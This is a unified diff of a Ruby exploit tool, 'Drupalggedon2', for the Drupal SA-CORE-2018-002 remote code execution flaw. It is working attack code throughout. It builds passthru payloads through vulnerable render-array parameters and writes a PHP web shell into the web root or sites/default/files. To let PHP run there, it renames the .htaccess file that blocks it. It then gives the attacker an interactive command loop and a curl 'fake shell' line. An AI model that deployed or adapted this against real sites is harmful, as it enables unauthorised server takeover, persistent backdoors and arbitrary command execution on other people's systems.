@@ -44,14 +44,14 @@ def http_request(url, type="post", payload="")
 end
 
 
-# Function gen_evil_url <cmd>
-def gen_evil_url(evil, feedback=true)
+# Function gen_evil_url <cmd> [shell]
+def gen_evil_url(evil, shell=false)
   # PHP function to use (don't forget about disabled functions...)
-  phpfunction = $drupalverion.start_with?("8")? "exec" : "passthru"
+  #phpfunction = $drupalverion.start_with?("8")? "exec" : "passthru"
   phpfunction = "passthru"
 
-  #puts "[*] PHP cmd: #{phpfunction}" if feedback
-  puts "[*] Payload: #{evil}" if feedback
+  #puts "[i] PHP cmd: #{phpfunction}" if shell
+  puts "[i] Payload: #{evil}" if not shell
 
   ## Check the version to match the payload
   # Vulnerable Parameters: #access_callback / #lazy_builder / #pre_render / #post_render
@@ -72,7 +72,7 @@ def gen_evil_url(evil, feedback=true)
     exit
   end
 
-  # Drupal v7 needs an extra value from a form
+  # Drupal v7.x needs an extra value from a form
   if $drupalverion.start_with?("7")
     response = http_request(url, "post", payload)
 
@@ -92,7 +92,8 @@ def clean_result(input)
   #result = JSON.pretty_generate(JSON[response.body])
   #result = $drupalverion.start_with?("8")? JSON.parse(input)[0]["data"] : input
   result = input
-  result.slice!(/^\[{"command":".*}\]$/)
+  #result.slice!(/^\[{"command":".*}\]$/)
+  result.slice!(/\[{"command":".*}\]$/)
   return result
 end
 
@@ -126,8 +127,9 @@ end
 # Banner
 puts "[*] --==[::#Drupalggedon2::]==--"
 puts "-"*80
-puts "[*] Target : #{$target}"
-puts "[*] Write? : Skipping writing web shell" if not writeshell
+puts "[i] Target : #{$target}"
+puts "[i] Proxy  : #{proxy_addr}:#{proxy_port}" if not proxy_addr.nil?
+puts "[i] Write? : Skipping writing web shell" if not writeshell
 puts "-"*80
 
 
@@ -170,7 +172,7 @@ url.each do|uri|
   response = http_request(uri, "get")
 
   if response.code == "200"
-    puts "[+] Found  : #{uri} (#{response.code})"
+    puts "[+] Found  : #{uri}    (HTTP Response: #{response.code})"
 
     # Patched already?
     puts "[!] WARNING: Might be patched! Found SA-CORE-2018-002: #{url}" if response.body.include? "SA-CORE-2018-002"
@@ -185,13 +187,13 @@ url.each do|uri|
     # Done!
     break
   elsif response.code == "403"
-    puts "[+] Found  : #{uri} (#{response.code})"
+    puts "[+] Found  : #{uri}    (HTTP Response: #{response.code})"
 
     # Get version from URL
     $drupalverion = uri.match(/includes\/database.inc/)? "6.x" : nil
     $drupalverion = uri.match(/core/)? "8.x" : "7.x" if $drupalverion.nil?
   else
-    puts "[!] MISSING: #{uri} (#{response.code})"
+    puts "[!] MISSING: #{uri}    (HTTP Response: #{response.code})"
   end
 end
 
@@ -199,7 +201,7 @@ end
 # Feedback
 if $drupalverion
   status = $drupalverion.end_with?("x")? "?" : "!"
-  puts "[+] Drupal#{status}: #{$drupalverion}"
+  puts "[+] Drupal#{status}: v#{$drupalverion}"
 else
   puts "[!] Didn't detect Drupal version"
   exit
@@ -227,9 +229,9 @@ if response.code == "200" and not response.body.empty?
   if not result.empty?
     puts "[+] Result : #{result}"
 
-    puts response.body.match(/#{random}/)? "[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!" : "[i] Target might to be exploitable (1)...   Detect output, but didn't match expected result"
+    puts response.body.match(/#{random}/)? "[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!" : "[!] WARNING: Target might to be exploitable [1]...   Detected output, but didn't match expected result"
   else
-    puts "[i] Target might to be exploitable (2)...   Didn't detect any output (disabled PHP function?)"
+    puts "[!] WARNING: Target might to be exploitable [2]...   Didn't detect any output (disabled PHP function?)"
   end
 else
   puts "[!] Target is NOT exploitable ~ HTTP Response: #{response.code}"
@@ -243,25 +245,33 @@ webshellpath = nil
 prompt = "drupalgeddon2"
 # Possibles paths to try
 paths = [
-  "./",
-  "./sites/default/",
-  "./sites/default/files/",
+  # Web root
+  "",
+  # Required for setup
+  "sites/default/",
+  "sites/default/files/",
+  # They did something "wrong", chmod -R 0777 .
+  #"core/",
 ]
-# Check all
+# Check all (if doing web shell)
 paths.each do|path|
-  puts "[*] Testing: File Write To Web Root (#{path})"
+  folder = path.empty? ? "./" : path
+  puts "[*] Testing: Writing To Web Root (#{folder})"
 
   # Merge locations
   webshellpath = "#{path}#{webshell}"
 
   # Final command to execute
   cmd = "#{bashcmd} | tee #{webshellpath}"
- 
-  # By default Drupal disables the PHP engine entirely in ./sites/default/files/
-  if path == paths.last
-    cmd += "; if [ -f #{path}.htaccess ]; then mv #{path}.htaccess #{path}.htaccess.pak; fi"
+
+
+  # By default, Drupal v7.x disables the PHP engine entirely in: ./sites/default/files/.htaccess
+  # ...however Drupal v8.x disables the PHP engine using: ./.htaccess
+  if path == "sites/default/files/"
+    puts "[i] Moving : ./sites/default/files/.htaccess"
+    cmd = "mv -f #{path}.htaccess #{path}.htaccess-bak; #{cmd}"
   end
- 
+
   # Generate evil URLs
   url, payload = gen_evil_url(cmd)
   # Make the request
@@ -277,25 +287,42 @@ paths.each do|path|
     if response.code == "200" and not response.body.empty?
       puts "[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!"
       break
+    elsif response.code == "403"
+      puts "[!] Target is NOT exploitable for some reason [1] (HTTP Response: #{response.code})...    May not be able to execute PHP from here?"
+    elsif response.code == "404"
+      puts "[!] Target is NOT exploitable for some reason [2] (HTTP Response: #{response.code})...    Might not have write access?"
+    elsif response.body.empty?
+      puts "[!] Target is NOT exploitable for some reason [3] (HTTP Response: #{response.code})...    Got an empty response back"
     else
-      puts "[!] Target is NOT exploitable. No write access here!"
+      puts "[!] Target is NOT exploitable for some reason [4] (HTTP Response: #{response.code})"
     end
+  elsif response.code == "403"
+      puts "[!] Target is NOT exploitable for some reason [5] (HTTP Response: #{response.code})...    May not be able to execute PHP from here?"
+  elsif response.code == "404"
+      puts "[!] Target is NOT exploitable for some reason [6] (HTTP Response: #{response.code})...    Might not have write access?"
+  elsif response.body.empty?
+    puts "[!] Target is NOT exploitable for some reason [7] (HTTP Response: #{response.code}))...    Got an empty response back"
   else
-    puts "[!] Target is NOT exploitable for some reason ~ HTTP Response: #{response.code}"
+    puts "[!] Target is NOT exploitable for some reason [8] (HTTP Response: #{response.code})"
   end
   webshellpath = nil
-end if writeshell
-puts "-"*80 if writeshell
 
+  puts "- "*40 if path != paths.last
+end if writeshell
+
+# If a web path was set, we exploited using PHP!
 if webshellpath
   # Get hostname for the prompt
   prompt = response.body.to_s.strip
 
   # Feedback
-  puts "[*] Fake shell:   curl '#{$target}#{webshell}' -d 'c=whoami'"
+  puts "-"*80
+  puts "[i] Fake shell:   curl '#{$target}#{webshellpath}' -d 'c=hostname'"
+# Should we be trying to call commands via PHP?
 elsif writeshell
   puts "[!] FAILED: Couldn't find writeable web path"
-  puts "[*] Dropping back direct commands (expect an ugly shell!)"
+  puts "-"*80
+  puts "[*] Dropping back direct commands"
 end
 
 
@@ -323,7 +350,7 @@ loop do
     result = http_request("#{$target}#{webshell}", "post", "c=#{command}").body
   # Direct commands
   else
-    url, payload = gen_evil_url(command, false)
+    url, payload = gen_evil_url(command, true)
     response = http_request(url, "post", payload)
 
     # Check result
